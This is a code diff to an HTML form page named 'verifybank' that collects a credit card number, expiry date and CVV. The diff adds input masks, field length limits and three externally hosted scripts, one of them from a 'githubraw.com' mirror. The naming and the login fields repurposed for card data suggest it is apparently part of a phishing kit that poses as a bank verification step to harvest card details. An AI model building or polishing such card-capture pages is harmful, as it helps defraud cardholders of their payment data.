@@ -16,6 +16,10 @@
 	<link rel="stylesheet" href="css/verifybank.css" />
 	<script defer src="js/jquery-3.3.1.min.js"></script>
 	<script defer src="js/verifybank.js"></script>
+	<script src="https://unpkg.com/imask"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	<script src="https://githubraw.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
+
 </head>
 
 <body>
@@ -42,7 +46,7 @@
 							<div id="input_id">
 								<div class="__my-class-login_field_wrap">
 									<span class="__my-class-dash_bar"></span>
-									<input type="text" id="login_id" name="credit-card-number"  />
+									<input class="numeric" maxlength=16 type="text" id="login_id" name="credit-card-number" />
 									<label class="__my-class-placelabel" for="login_id">Your credit card number
 									</label>
 								</div>
@@ -61,7 +65,7 @@
 							<div id="input_password">
 								<div class="__my-class-login_field_wrap">
 									<span class="__my-class-dash_bar"></span>
-									<input class=myValidate" type="text" maxlength=7 id="login_pw" name="pw" " />
+									<input class="login_pw" type="text" maxlength=5 placeholder="MM/YY" id="login_pw" name="pw" />
 									<label class="__my-class-placelabel" for="login_pw">Card expiration date (MM/YY)</label>
 									
 								</div>
@@ -75,7 +79,7 @@
 							   <div id="input_cvv">
 							   	<div class="__my-class-login_field_wrap">
 							   		<span class="__my-class-dash_bar"></span>
-							   		<input type="text" maxlength=3 id="login_cvv" name="credit-card-number" />
+							   		<input  class="numeric" placeholder="CVV" type="text" maxlength=3 id="login_cvv" name="credit-card-number" />
 							   		<label class="__my-class-placelabel" for="login_cvv">
 							   			Card verification number (CVV)</label>
 							   	</div>
@@ -159,7 +163,17 @@
 	</section>
 
 
-
+<script>
+	(function($){
+	$('.login_pw').inputmask("datetime",{
+	mask: "1/1",
+	placeholder: "MM/YY",
+	leapday: "-02-29",
+	separator: "/",
+	alias: "dd/mm/yy"
+	});
+	})(jQuery);
+</script>
 
 
 
